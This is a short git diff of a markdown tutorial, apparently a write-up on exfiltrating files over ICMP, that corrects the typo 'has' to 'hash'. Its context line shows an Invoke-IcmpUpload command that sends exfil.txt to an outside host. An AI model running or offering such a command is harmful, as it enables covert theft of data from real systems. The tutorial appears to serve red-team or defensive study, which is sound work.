@@ -376,7 +376,7 @@ Invoke-IcmpUpload -IPAddress exfiltracer123.hulkgosmash.com -file .\exfil.txt
 
 ![Description of the image](images/33.png)
 
-Back on the server it will automatically detect once the file transfer has completed and terminate the program. Then we just need to verify the has with the below command. 
+Back on the server it will automatically detect once the file transfer has completed and terminate the program. Then we just need to verify the hash with the below command. 
 
 ```bash
 sha256sum exfil.txt
